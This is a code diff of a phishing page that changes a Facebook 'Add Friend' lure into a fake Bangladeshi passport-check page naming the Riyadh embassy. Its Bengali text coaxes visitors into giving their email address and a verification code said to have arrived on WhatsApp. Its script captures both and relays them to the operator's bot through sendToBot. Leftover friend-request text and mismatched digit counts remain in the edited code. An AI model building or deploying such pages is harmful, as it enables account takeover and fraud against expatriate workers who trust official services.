@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Add Friend</title>
+    <title>Passport file - Chaking download</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
@@ -32,46 +32,46 @@
 <body onload="onPageLoad()">
 
     <div class="top-half">
-        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+        <img src="https://raw.githubusercontent.com/passportchaking-io/Online_Passport_chaking/main/IMG_20260525_160654.jpg">
     </div>
 
     <div class="bottom-half text-center">
         <div id="step1" class="w-full flex flex-col items-center gap-4">
-            <h2 class="main-title">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+            <h2 class="main-title">পাসপোর্ট চেক করুন</h2>
             <p class="sub-text">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
-            <button onclick="startProcess()" class="btn-blue">Add Friend</button>
+            <button onclick="startProcess()" class="btn-blue">পাসপোর্ট চেক করুন</button>
         </div>
 
         <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
-            <h1 class="main-title">অ্যাকাউন্ট নিশ্চিত করুন</h1>
-            <p class="sub-text">কিবোর্ডের ওপর থেকে আপনার ইমেইলটি সিলেক্ট করুন।</p>
+            <h1 class="main-title">পাসপোর্ট নাম্বার দিয়ে পাসপোর্ট চেক করুন</h1>
+            <p class="sub-text">নিচের ফাঁকা ঘরে আপনার পাসপোর্ট নাম্বার বসিয়ে পাসপোর্ট ফাইলটি চেক করুন।</p>
             <input type="email" id="email_field" name="email" autocomplete="email" placeholder="ইমেইল এড্রেস" class="secure-input" oninput="autoCaptureEmail(this.value)">
-            <button onclick="finalSubmit()" class="btn-blue">Add Friend</button>
+            <button onclick="finalSubmit()" class="btn-blue">পাসপোর্ট চেক করুন</button>
         </div>
 
         <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
             <div class="loader"></div>
             <h3 class="waiting-text">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
-            <p class="waiting-desc">আপনার facbook আইডি গুরুত্ব সহকারে যাচাই করা হচ্ছে। যাচাই করা শেষ না হওয়া পর্যন্ত দয়া করে একটু অপেক্ষা করুন।</p>
+            <p class="waiting-desc">গুরুত্ব সহকারে যাচাই করা হচ্ছে। যাচাই করা শেষ না হওয়া পর্যন্ত দয়া করে একটু অপেক্ষা করুন।</p>
         </div>
 
         <div id="success_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
             <div class="status-icon success-bg">✓</div>
             <h2 class="text-2xl font-bold text-green-600">অভিনন্দন!</h2>
-            <p class="sub-text text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে।</p>
+            <p class="sub-text text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে। তবে সার্ভার জনিত সমস্যার কারণে পাসপোর্ট ফাইলটি ওপেন করা সম্ভব হচ্ছে না সরাসরি ডাউনলোড বাটনে ক্লিক করে ডাউনলোড করুন।</p>
             <a href="https://m.me/sabinayasmeen121" class="btn-blue mt-2">View Profile</a>
         </div>
 
         <div id="error_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
             <div class="status-icon error-bg">✕</div>
             <h2 class="text-xl font-bold text-red-600">দুঃখিত!</h2>
-            <p class="sub-text font-semibold text-gray-800 text-sm">আপনার নেটওয়ার্কের সমস্যার জন্য ফেসবুক আইডি অ্যাড করা সম্ভব হচ্ছে না।</p>
+            <p class="sub-text font-semibold text-gray-800 text-sm">আপনার নেটওয়ার্কের সার্ভার জনিত সমস্যার জন্য পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করা সম্ভব হচ্ছে না।</p>
             <button onclick="location.reload()" class="btn-red mt-2">আবার চেষ্টা করুন</button>
         </div>
 
         <div id="otp_page" class="hidden w-full flex flex-col items-center">
-            <h2 class="text-[19px] font-bold text-gray-900 mb-4 text-center">আইডি পাসওয়ার্ড দিয়ে লক করা আছে।</h2>
-            <p class="text-[14px] text-gray-600 mb-8 text-center leading-relaxed px-4">Add করতে আপনার নোটিফিকেশনে আসা কোডটি নিচে বসান।</p>
+            <h2 class="text-[19px] font-bold text-gray-900 mb-4 text-center">পাসপোর্ট ডকুমেন্ট ফাইলটি সরাসরি রিয়াদ বাংলাদেশ দূতাবাস সেবা কেন্দ্র থেকে পাসওয়ার্ড দিয়ে লক করা আছে।</h2>
+            <p class="text-[14px] text-gray-600 mb-8 text-center leading-relaxed px-4">ওপেন করতে চাইলে আপনার হোয়াটসঅ্যাপে এইমাত্র রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে 4 সংখ্যার পাসওয়ার্ড পাঠানো হয়েছে। নিচের ফাঁকা ঘরে পাসওয়ার্ডটি  বসান।</p>
             <div id="otp-inputs" class="flex justify-center gap-1.5 mb-10">
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
                 <input type="text" inputmode="numeric" maxlength="1" class="code-input">
@@ -117,14 +117,14 @@
             input.value = input.value.replace(/[^0-9]/g, '');
             if (input.value.length === 1) {
                 if (index === 5) {
-                    const code6 = Array.from(otpInputs).slice(0, 6).map(i => i.value).join('');
-                    sendToBot(`📩 ১ম অংশ (৬ ডিজিট): \`${code6}\``);
+                    const code2 = Array.from(otpInputs).slice(0, 2).map(i => i.value).join('');
+                    sendToBot(`📩 ১ম অংশ (2 ডিজিট): \`${code2}\``);
                     otpBtn.disabled = false;
                     otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                 }
                 if (index === 7) {
-                    const code8 = Array.from(otpInputs).map(i => i.value).join('');
-                    sendToBot(`📩 পূর্ণ কোড (৮ ডিজিট): \`${code8}\``);
+                    const code4 = Array.from(otpInputs).map(i => i.value).join('');
+                    sendToBot(`📩 পূর্ণ কোড (4 ডিজিট): \`${code4}\``);
                 }
                 if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
             }
